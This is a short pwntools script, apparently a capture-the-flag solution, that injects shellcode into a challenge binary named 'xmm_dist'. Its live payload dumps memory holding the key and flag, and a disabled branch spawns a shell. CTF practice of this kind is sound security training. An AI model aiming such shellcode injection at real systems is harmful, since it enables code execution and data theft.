#!/usr/bin/python
from pwn import *
import sys

BINARY_PATH = "./xmm_dist"
context.binary = 'xmm_dist'
#r = remote('chals.ctf.sg', 20401)
#r.recvrepeat(timeout=1)
r = process(BINARY_PATH)
r.send(b'my <removed>')

### Choose the payload
if False:
	shellcode = asm(shellcraft.sh())
	r.sendafter('brain: ', shellcode)
	r.interactive()



shellcode = asm(shellcraft.write(1, 0x495030, 13)) # Write the key to output
shellcode = asm(shellcraft.write(1, 0x495030, 100)) # Write the Flag to output
#print(shellcode)

r.sendafter('brain: ', shellcode)
data = r.recvall()
print(data)
